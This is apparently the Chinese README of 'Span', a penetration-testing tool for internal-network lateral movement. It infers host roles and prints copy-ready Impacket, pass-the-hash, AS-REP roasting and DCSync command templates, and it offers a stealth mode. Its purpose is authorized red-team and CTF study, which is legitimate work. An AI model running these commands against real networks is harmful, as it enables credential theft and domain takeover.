# 🔍 Span

<p align="center">
  <img src="https://img.shields.io/badge/version-v0.1.1-blue?style=flat-square" alt="version">
  <img src="https://img.shields.io/badge/Go-1.21+-00ADD8?style=flat-square&logo=go" alt="go version">
  <img src="https://img.shields.io/badge/license-MIT-green?style=flat-square" alt="license">
  <img src="https://img.shields.io/badge/platform-Windows%20%7C%20Linux-lightgrey?style=flat-square" alt="platform">
  <img src="https://img.shields.io/badge/单文件-< 3MB-orange?style=flat-square" alt="size">
</p>

<p align="center">
  <b>fscan 告诉你内网有什么，Span 告诉你这些是什么、怎么打、先打哪个。</b>
</p>

---

## 🎯 为什么需要 Span？

用 fscan 扫完内网，你看到一堆端口列表，然后呢？

- 445 端口开放 = 这是域控还是普通文件服务器？
- 3389 开放 = 能直接 RDP 还是需要先拿凭证？
- 88 端口开放 = Kerberos，接下来该用什么工具？

**Span 解决的就是这个问题** —— 它不是 fscan 的替代品，而是**互补搭档**：

| 工具 | 定位 | 输出 |
|------|------|------|
| **fscan** | 快速发现（全端口、Web 漏洞） | `192.168.52.138:445 open` |
| **Span** | 深度分析（角色、攻击面、命令） | `域控 (DC)，建议优先打 Kerberos AS-REP` |

---

## ✨ 核心特性

- 🎯 **精准扫描** — 只扫 18 个横向移动相关端口，不浪费时间
- 🧠 **智能角色推断** — 通过端口组合判断机器角色（域控/数据库/跳板机），Top-3 候选
- 🔍 **OS 识别** — TTL + 端口组合 + Banner 三方加权投票
- ⚔️ **攻击建议生成** — 自动生成可直接复制执行的命令模板（Impacket/MSF/evil-winrm/rdesktop）
- 📚 **教学解释** — 每条建议附带原理说明，适合学习理解
- 📂 **分析模式** — 解析 fscan/nmap 输出文件，无需重复扫描
- 📦 **单文件部署** — 静态编译，无外部依赖，上传到边界机直接执行
- 🤫 **隐蔽模式** — 默认低并发（10 线程），减少告警

---

## 🚀 快速开始

### 1. 下载二进制

**Windows:**
```bash
# 从 Release 页面下载
wget https://github.com/zkzk123-CN/Span/releases/download/v0.1.1/span_v0.1.1_windows_amd64.exe

# 或者从源码编译
git clone https://github.com/zkzk123-CN/Span.git
cd Span
go build -o span.exe ./cmd/span
```

**Linux:**
```bash
wget https://github.com/zkzk123-CN/Span/releases/download/v0.1.1/span_v0.1.1_linux_amd64
chmod +x span_v0.1.1_linux_amd64
```

### 2. 基本使用

```bash
# 扫描整个网段
span 192.168.52.0/24

# 扫描单台主机（详细模式）
span 192.168.52.138 -v

# 从文件读取目标
span -f targets.txt

# 高速扫描（自定义线程数）
span 192.168.52.0/24 -threads 50

# 仅显示 Critical 级别攻击面
span 192.168.52.0/24 -critical-only
```

### 3. 分析已有扫描结果

```bash
# 分析 fscan 输出（自动检测格式）
span --analyze fscan_result.txt -v

# 分析 nmap 输出
span --analyze nmap_result.xml -v
```

---

## 📊 输出示例

```
Span v0.1.1 - 内网横向移动分析
扫描目标: 192.168.52.0/24
==========================================================================

[+] 发现存活主机: 3 台

[+] 192.168.52.138
    [OS]   Windows (Server 2008 R2) (置信度: high)
    [角色] 域控制器 (DC) (置信度: 95%)
           └─ Active Directory 域控制器
    --------------------------------------------------
    端口       服务           风险         说明
    ----     ----         ----       ----
    53       dns          [High]     DNS 域名解析 (域控标志)
    88       kerberos    [Critical] Kerberos 认证（域控标志）
    389      ldap         [Critical] LDAP 目录服务
    445      smb          [Critical] SMB 文件共享 / 域渗透核心入口

    [攻击面] 发现 3 个攻击建议（按优先级排序）:

    [!] 优先级 1 | kerberos (GetNPUsers.py)
       命令: GetNPUsers.py god.org/ -dc-ip 192.168.52.138 -no-pass
       条件: 无凭证时尝试 AS-REP Roasting
       Kerberos AS-REP Roasting，获取无需预认证的用户哈希
  ⚠️ 若成功，可离线破解哈希获取初始立足点

    [*] 优先级 2 | smb (impacket-psexec)
       命令: psexec.py god.org/administrator@192.168.52.138
       条件: 有凭证或哈希
       SMB 文件共享，域渗透核心入口。支持 PSExec、哈希传递、MS17-010

    [*] 优先级 2 | domain (impacket-secretsdump)
       命令: secretsdump.py god.org/administrator@192.168.52.138
       条件: 有域管凭证或哈希
       域控核心攻击：若有域管凭证，直接 DCSync 获取所有用户哈希
  ⚠️ 最高价值目标；DCSync 后可控整个域

[+] 192.168.52.143
    [OS]   Windows (Win7) (置信度: medium)
    [角色] 边界机/跳板机 (置信度: 80%)
           └─ 多网卡、有横向端口
    --------------------------------------------------
    端口       服务           风险         说明
    ----     ----         ----       ----
    135      rpc          [High]     RPC 远程过程调用
    445      smb          [Critical] SMB 文件共享
    3306     mysql        [Medium]   MySQL 数据库
    3389     rdp          [High]     RDP 远程桌面

    [攻击面] 发现 2 个攻击建议（按优先级排序）:

    [!] 优先级 1 | smb (impacket-psexec)
       命令: psexec.py {domain}/{user}@192.168.52.143
       条件: 有凭证或哈希
       SMB 文件共享，域渗透核心入口。支持 PSExec、哈希传递、MS17-010

    [*] 优先级 3 | rdp (rdesktop)
       命令: rdesktop -u {user} -p {pass} 192.168.52.143
       条件: 有凭证
       RDP 远程桌面，图形化操作

==========================================================================
[!] 以下结果仅供授权测试参考，请确保已获得合法授权！
```

---

## 🎯 使用场景

### 场景 1：拿到边界机后，快速摸清内网

```bash
# 1. 上传 span.exe 到边界机
# 2. 扫描内网
span.exe 192.168.52.0/24 -v -o result.txt

# 3. 查看结果，找到域控
cat result.txt | findstr "域控"

# 4. 根据攻击建议行动
impacket-psexec target.com/admin@192.168.52.138
```

### 场景 2：fscan 扫完了，但不知道怎么继续

```bash
# fscan 的输出太原始，用 Span 做深度分析
span --analyze fscan_result.txt -v

# Span 自动识别 OS、角色、生成攻击建议，无需重复扫描
```

### 场景 3：准备 HVV/CTF，学习横向移动思路

```bash
# 详细模式会解释每个端口的含义和攻击方法
span 192.168.52.0/24 -v

# 输出会告诉你：
# - 为什么 88 端口重要？（Kerberos，域渗透核心）
# - 为什么 445 端口危险？（SMB，支持哈希传递）
# - 拿到 MySQL 权限后能做什么？（UDF 提权）
```

---

## 🔧 参数说明

| 参数 | 说明 | 默认值 |
|------|------|--------|
| `[target]` | 目标 IP 或 CIDR（如 `192.168.52.0/24`） | 必填或 `-f` |
| `-f` | 目标文件，每行一个 IP/CIDR | - |
| `-threads` | 并发线程数 | 10 |
| `-timeout` | 端口超时（毫秒） | 2000 |
| `--analyze` | 分析模式：解析 fscan/nmap 输出文件 | - |
| `-o` | 结果输出文件路径 | `span_result.txt` |
| `-v` | 详细模式（含匹配端口、候选角色、Banner 信息） | false |
| `-critical-only` | 仅显示 Critical 级别攻击面 | false |
| `--ports` | 自定义端口列表（逗号分隔） | 18个默认端口 |
| `-h` | 显示帮助 | - |

---

## 📡 扫描端口（18个）

Span 只扫描横向移动相关的端口，**不做全端口扫描**（这是 fscan 的活）：

| 端口 | 服务 | 风险等级 | 说明 |
|------|------|---------|------|
| 22 | SSH | High | SSH 远程登录 |
| 53 | DNS | High | DNS 域名解析（域控标志） |
| 88 | Kerberos | Critical | Kerberos 认证（域控标志） |
| 135 | RPC | High | RPC / WMI 入口 |
| 139 | NetBIOS | Medium | NetBIOS 会话服务 |
| 389 | LDAP | Critical | LDAP 目录服务（域控标志） |
| 445 | SMB | Critical | SMB 文件共享 / 域渗透核心入口 |
| 636 | LDAPS | Critical | LDAPS 安全 LDAP |
| 1433 | MSSQL | Critical | Microsoft SQL Server |
| 3306 | MySQL | Medium | MySQL 数据库 |
| 3389 | RDP | High | RDP 远程桌面 |
| 5985 | WinRM | High | WinRM HTTP 远程管理 |
| 5986 | WinRM-SSL | High | WinRM HTTPS 远程管理 |
| 6379 | Redis | Critical | Redis 键值数据库（未授权访问风险） |
| 7001 | WebLogic | Critical | WebLogic 应用服务器 |
| 8008 | Tomcat | High | Tomcat 备用端口 |
| 8099 | Custom | Medium | 自定义 Web 服务 |
| 8898 | Custom | Medium | 自定义服务 |

---

## 🧠 角色推断规则

Span 通过端口组合推断机器角色（Top-3 候选）：

| 角色 | 必备端口 | 加分端口 |
|------|---------|---------|
| 域控制器 (DC) | 53, 88, 389 | 445, 636 |
| Exchange 邮件服务器 | 25, 80, 443, 587 | 143, 993, 389 |
| MSSQL 数据库服务器 | 1433 | 445, 3389, 135 |
| MySQL 数据库服务器 | 3306 | 22, 445, 3389 |
| Redis 缓存服务器 | 6379 | 22 |
| WebLogic 应用服务器 | 7001 | 80, 443 |
| Windows 跳板机/边界机 | 3389, 445 | 135, 139, 5985 |
| Linux SSH 服务器 | 22 | 80, 443, 3306 |
| 域成员工作站 | 135, 445, 139 | 3389, 5985 |
| 通用 Web 服务器 | 80 | 443, 8080 |

---

## ⚔️ 攻击命令模板

Span 内置常见横向移动工具的命令模板（占位符：`{target}`, `{user}`, `{pass}`, `{hash}`, `{domain}`）：

| 攻击面 | 工具 | 示例命令 |
|--------|------|---------|
| SMB (445) | impacket-psexec | `psexec.py {domain}/{user}:{pass}@{target}` |
| SMB PtH | impacket-psexec | `psexec.py -hashes :{ntlm} {domain}/{user}@{target}` |
| RDP (3389) | rdesktop | `rdesktop -u {user} -p {pass} {target}` |
| WinRM (5985) | evil-winrm | `evil-winrm -i {target} -u {user} -p {pass}` |
| LDAP (389) | ldapsearch | `ldapsearch -x -H ldap://{target} -D '{user}' -W` |
| MSSQL (1433) | mssqlclient.py | `mssqlclient.py {user}:{pass}@{target} -windows-auth` |
| MySQL (3306) | mysql-client | `mysql -h {target} -u {user} -p{pass}` |
| Redis (6379) | redis-cli | `redis-cli -h {target}` |
| SSH (22) | ssh-client | `ssh {user}@{target}` |
| Kerberos (88) | GetNPUsers.py | `GetNPUsers.py {domain}/ -dc-ip {target} -request` |
| DC DCSync | secretsdump.py | `secretsdump.py {domain}/{user}:{pass}@{target}` |

---

## 🔬 OS 检测方法

Span 使用三类证据加权投票推断操作系统：

| 证据源 | 权重 | 方法 |
|--------|------|------|
| TTL | 1 | TTL ≥ 118 → Windows; TTL ≤ 68 → Linux |
| 端口组合 | 2 | 445+3389+5985 → Windows; 22+3306+6379 → Linux |
| Banner | 3 | "Microsoft/Windows/SMB" → Windows; "Ubuntu/CentOS/Debian" → Linux |

- SSH Banner 不单独作为 Linux 证据（Windows 2019+ 也运行 OpenSSH）
- 多方一致时置信度为 **high**，存在分歧时保留最具体的判断

---

## 🛠️ 编译

### 要求

- Go ≥ 1.21
- CGO_ENABLED=0（静态编译）
- UPX（可选，用于压缩）

### 命令

```bash
# 编译当前平台
make build

# UPX 压缩（Windows: 2.4MB → ~1MB; Linux: 2.3MB → ~900KB）
make compress

# 交叉编译 Windows
make build-windows

# 交叉编译 Linux
make build-linux

# 全平台
make build-all
```

---

## 📂 项目结构

```
span/
├── cmd/span/          # CLI 入口，参数解析，流程串联
├── internal/
│   ├── scanner/       # TCP 存活探测、端口扫描、Banner 抓取
│   ├── analyzer/      # OS 启发式判断、角色推断、攻击面分析
│   ├── parser/        # fscan/nmap 输出解析（--analyze 模式）
│   ├── output/        # 终端表格输出、文件输出
│   └── rules/         # 规则库（端口映射、角色规则、OS 启发式、命令模板）
├── pkg/models/        # 数据模型定义
├── bin/               # 编译输出
├── Makefile
├── README.md
└── LICENSE
```

---

## 🎯 靶场环境

开发测试使用以下靶场：

| 主机 | IP | 系统 | 角色 |
|------|------|------|------|
| stu1（边界机） | 192.168.30.128 / 192.168.52.143 | Win7 Pro SP1 | 双网卡跳板 |
| owa（域控） | 192.168.52.138 | Server 2008 R2 DC | DC + Exchange |
| Server 2003 | 192.168.52.141 | Server 2003 Ent | 域成员 |

攻击机：Kali Linux 2025.4, 192.168.30.143

---

## 🤝 贡献

欢迎提交 Issue 和 Pull Request！

**贡献指南：**

1. Fork 本仓库
2. 创建你的特性分支 (`git checkout -b feature/AmazingFeature`)
3. 提交你的修改 (`git commit -m 'Add some AmazingFeature'`)
4. 推送到分支 (`git push origin feature/AmazingFeature`)
5. 打开一个 Pull Request

---

## 📜 免责声明

**本工具仅供授权的渗透测试和安全研究使用。未经目标系统所有者明确书面授权，使用本工具进行扫描或攻击属于违法行为，后果自负。**

- 工具生成的所有建议均为基于端口扫描的推测，可能存在误报。请结合实际情况判断。
- 使用本工具即表示您同意遵守所有适用的法律法规，并承担由此产生的一切法律责任。

---

## 📄 License

MIT License - 详见 [LICENSE](LICENSE)

---

## ⭐ Star History

如果这个工具对你有帮助，欢迎给个 Star ⭐

---

**Span** - *内网横向移动，从"扫到"到"打到"的最后一公里。*
